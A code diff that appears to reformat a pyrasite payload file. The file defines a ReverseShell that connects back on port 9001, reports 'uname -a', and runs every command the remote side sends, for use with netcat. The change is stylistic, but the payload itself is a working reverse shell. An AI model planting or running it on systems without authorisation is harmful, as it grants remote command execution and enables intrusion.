@@ -17,20 +17,21 @@
 
 import pyrasite
 
-class ReverseShell(pyrasite.ReverseConnection):
 
-    reliable = False # This payload is designed to be used with netcat
+class ReverseShell(pyrasite.ReverseConnection):
+    reliable = False  # This payload is designed to be used with netcat
     port = 9001
 
     def on_connect(self):
-        uname = pyrasite.utils.run('uname -a')[1]
+        uname = pyrasite.utils.run("uname -a")[1]
         self.send("%sType 'quit' to exit\n%% " % uname)
 
     def on_command(self, cmd):
-        p, out, err = pyrasite.utils.run(cmd)
+        _process, out, err = pyrasite.utils.run(cmd)
         if err:
             out += err
-        self.send(out + '\n% ')
+        self.send(out + "\n% ")
         return True
+
 
 ReverseShell().start()
